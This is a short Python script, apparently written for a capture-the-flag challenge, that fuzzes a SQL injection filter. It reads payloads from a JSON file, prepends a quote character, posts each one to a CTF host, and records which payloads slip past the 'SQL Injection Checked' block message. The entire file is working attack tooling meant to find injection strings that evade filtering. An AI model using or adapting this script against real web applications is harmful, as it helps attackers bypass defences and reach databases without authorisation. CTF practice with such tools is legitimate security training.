import json
from requests_html import HTMLSession

url = 'http://532-8a7238f0-16ac-4231.nss.ctfer.vip:9080/index.php'
prefix = """1'"""
cmd = 'id'
method = 'post'
exclude = 'SQL Injection Checked'
s = HTMLSession()

work_lst = []
fuz_lst = []
def main():
    obj = init()
    for key, value, in obj.items():
        value = prefix + value
        if method == 'get':
            res = s.get(f'{url}?{cmd}={value}')
        else:
            res = s.post(url, data={cmd: value})

        if exclude and exclude in res.text:
            print('exclude', key, value)
            fuz_lst.append(key)
            continue
        print(key.center(24, '-') + '\n')
        # print(key.center(24, '-') + '\n', res.text)
        work_lst.append(key)


def init():
    jso = open('sql_fuzz.json', 'r').read()
    r = json.loads(jso)
    return r


if __name__ == '__main__':
    main()
    print('fuz list is ', fuz_lst)
    print('work list is ', work_lst)
